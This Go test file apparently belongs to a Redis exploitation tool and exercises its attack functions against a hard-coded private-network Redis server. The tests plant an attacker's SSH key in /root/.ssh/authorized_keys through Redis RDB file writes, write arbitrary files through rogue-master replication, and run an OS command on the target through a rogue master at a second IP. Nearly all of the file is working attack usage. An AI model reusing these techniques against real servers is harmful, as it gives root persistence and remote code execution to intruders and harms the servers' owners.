package core

import (
	"fmt"
	"testing"
)

var r = &Redis{
	Host:   "192.168.83.129",
	Port:   6379,
	User:   "",
	Passwd: "",
	Cmd:    "",
}

func TestExecute(t *testing.T) {
	//cmd := "ACL USERS"
	//redis.connect()
	//result := redis.execute(cmd)
	//log.Output(result)
	//log.Output(redis.dbsize())
	//log.Output(redis.info())
	//log.Output(redis.getAllKeys())
	//log.Output(redis.getUsers())
	r.AutoGather()
}

func TestRedis_WriteFile_by_RDBBack(t *testing.T) {
	//r.WriteFile_by_RDBBack("/tmp/auto_write_rdb", "auto_write_rdb_zxcqer")
	//r.WriteFile_by_RDBBack("/qwe/auto_write_rdb", "auto_write_rdb_zxcqer")
	//r.WriteFile_by_RDBBack("/root/auto_write_rdb", "auto_write_rdb_zxcqer")
	r.WriteFile_by_RDBBack("/root/.ssh/authorized_keys", []byte("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCweGCh5HPuOUDUnRGSFteqD+CTFCixJrOde5H4AmJ2vKTu8LihaFUU10jfit58GMtCFEggDeoEaBUDyzkWQK3F4bTvM8qv+zGZqYjhbaytAWgDfi78qHtuG6LfGpnZ4i/MLc2fHHo25OTVYtixh50JucsFSmvz8Oruqv4+8vy8CmoXWpciSUJLU7lSQzSB2pWTBFiDMvY+Sus/Ss54riEsedx8CUxy1GpBv316foMO4QZCcXihAqpSvsn1D+jMNnxy+DiOsQUgtH7tVEKnS0uqat/GGb6JyrssIuhVbe8n/1rJrEaGRLguWGAdYEUSqbm2ZGmx4hua3tP/oWit95M+09MMFhVZFqrQ74Z6Mtyr3upFOcIGVa1DYvAjO37jUvaUdlwBxzbkkjcgncGyUHxeNk+4cO+HvhuMDujyDhos99DeCAIjJynkGayRXq9YsPcmCQK2cd7sgYL9HR5MLvFC64qx03Yv0F11PpRp5ee3p65pI5ZTHmWKw7BXeSiNgEM= root@kali"))
}

func TestRedis_RedisDumpBackup(t *testing.T) {
	r.DumpBackup("D:\\tmp\\my.txt")
}

func TestRedis_WriteFile_by_RogueMaster(t *testing.T) {
	//data, _ := ioutil.ReadFile("D:\\tmp\\0220.txt")
	// 数据长度<=8会崩溃
	r.WriteFile_by_RogueMaster("/tmp/auto_rouge_master_test1", "192.168.159.1", 6379, []byte("1234567"), true)
	//r.WriteFile_by_RogueMaster("/tmp/auto_rouge_master_0220.txt", "192.168.159.1", data, true)
}
func TestRedis_OsExec_RogueMaster(t *testing.T) {
	err := r.OsExec_RogueMaster("192.168.83.1", "whoami", 6379, false, true)
	if err != nil {
		fmt.Println(err)
	}
	//info := r.info()
	//version := r.getVersion(info)
	//os := r.getOs(info)
	//platform := r.getPlatform(info)
	//fmt.Println("version: ", version)
	//fmt.Println("os: ", os)
	//fmt.Println("platform: ", platform)
}
